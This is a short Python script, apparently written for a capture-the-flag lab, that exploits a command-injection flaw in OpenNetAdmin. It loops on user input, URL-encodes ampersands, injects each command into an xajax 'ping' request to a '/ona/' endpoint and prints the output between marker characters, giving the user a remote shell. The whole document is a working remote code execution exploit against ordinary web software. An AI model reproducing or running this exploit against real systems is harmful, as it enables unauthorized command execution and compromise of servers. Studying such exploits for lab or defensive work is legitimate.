#!/usr/bin/python3

import requests
import urllib.parse


proxies = { 'http': 'http://127.0.0.1:8080'}
headers = {'Content-Type': 'application/x-www-form-urlencoded'}


while True:
	try:
		command = input("> ")

		
		'''
		Function determines whether badchar is present in string. If present, we turn the string into a list
		so we can iterate over each item for further analysis. Once badchar is found it is replaced with a urlencoded value.
		Lastly, the list is combined back into a str so it can be passed to the payload.
		'''
		if "&" in command:
			newcommand = list(command)
			for x,y in enumerate(newcommand):
				if y == '&':
					newcommand[x] = urllib.parse.quote(newcommand[x], safe='')
			command = "".join(newcommand)



		# Exploit used to compromise system. Format is used to insert user commands.
		payload = 'xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "|";{}; echo "|"&xajaxargs[]=ping'.format(command)

		

		# Http request that is sent to vulnerable webpage
		r = requests.post('http://10.10.10.171/ona/', data = payload, headers=headers ,proxies=proxies)

		
		#Filter to extract wanted values. "|" string is used for beginning and ending marker
		webpage = r.text.split('|')
		print(webpage[1])
				

	except KeyboardInterrupt:
		break
